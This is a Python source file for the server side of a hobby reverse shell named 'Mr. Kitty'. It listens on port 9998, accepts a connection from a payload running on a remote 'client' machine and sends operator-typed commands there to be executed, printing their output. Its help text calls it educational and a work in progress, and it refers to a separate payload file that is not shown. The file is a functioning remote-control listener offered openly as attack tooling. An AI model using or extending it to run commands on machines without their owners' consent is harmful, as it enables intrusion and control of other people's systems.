import platform # getting info about the system with this command
import argparse # user-friendly command-line interfaces
import socket # network stuff
import shlex # lexical analysis on the Unix shell
import subprocess # spawn processes, connect to I/O pipes, obtain return codes
import sys # system stuff
import textwrap # wrapping text
import threading

# CONSTS:
IP = '0.0.0.0'
PORT = 9998

# MrKitty class
class MrKitty:
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
    def createExecutable(self):
        pass

    def runAndListen(self):
        self.sock.bind((IP, PORT)) # listen to the requests on 127.0.0.1:9998
        self.sock.listen(5) # 5 maximum back log connections
        print(f'[*] Server is listening on IP {IP}:{PORT}')

        while True:
            #we receive the client socket in the client variable and the remote connection details in address:
            client, address = self.sock.accept()

            print(f'[*] Connection found from {address[0]}:{address[1]}')
            self.handleClient(client)
            # clientThread = threading.Thread(target=self.handleClient, args=(client))
            # clientThread.start()

    def handleClient(self, clientSocket):
            # we are executing a command 
            outputBuffer = b''
            while True:
                try:
                    # TODO: TO MODIFY THE WAY YOU WORK WITH THE BUFFER!
                    print("#>> Waiting for response..", end='\n')
                    while '\n' not in outputBuffer.decode():
                        # print("[*] I m reading!!..")
                        outputBuffer += clientSocket.recv(64)

                    stringBuffer = outputBuffer.decode()
                    print("#>> Output: " + stringBuffer)

                    buffer = input("Command #>> ")
                    try:
                        clientSocket.send(buffer.encode())
                    except Exception as eroare:
                        print(f"am o eroare: {eroare}")
                    
                    outputBuffer = b''

                except Exception as ex:
                    print(f'Server killed: {ex}')
                    self.sock.close()
                    sys.exit()



if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description=
        '''
            !!! USE IT WITH CAUTION (FOR EDUCATIONAL PURPOSES) !!!
                 .__....._             _.....__,
                    .": o :':         ;': o :".
                    `. `-' .'.       .'. `-' .'
                      `---'             `---'

            _...----...      ...   ...      ...----..._
         .-'__..-""'----    `.  `"`  .'    ----'""-..__`-.
        '.-'   _.--"""'       `-._.-'       '"""--._   `-.`
        '  .-"'                  :                  `"-.  ` - Mr. Kitty (alpha v1.0.0)
          '   `.              _.'"'._              .'   `
                `.       ,.-'"       "'-.,       .'
                  `.                           .'
                    `-._                   _.-'
                        `"'--...___...--'"`

        Mr. Kitty is a simple (IN PROGRESS) Python reverse shell project.
        When the connection is succesful, you can write commands on the client's machine. 
        It also returns the version and the name of the client's Operating System.
        For now, mrKitty is not doing too much, I just wanted to learn how can I actually do this.
        There is a lot of work, I will add other functionalities sooner or later.
        ''',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent(
            '''
            Example:
            You can run the command by mainKitty.py to start the server and kittyPayload.py on the client
            (work still in progress!!)
            '''
        )  
    )
    # parser.add_argument('-name', '--customName', help='Create a custom name')

    args = vars(parser.parse_args())
    fileName = None

    # if args['customName']:
    #     fileName = str(args['customName']) + ".exe"
    # else:
    #     fileName = "mrKitty.exe"
    
    # print(fileName)

    kitty = MrKitty()
    kitty.runAndListen()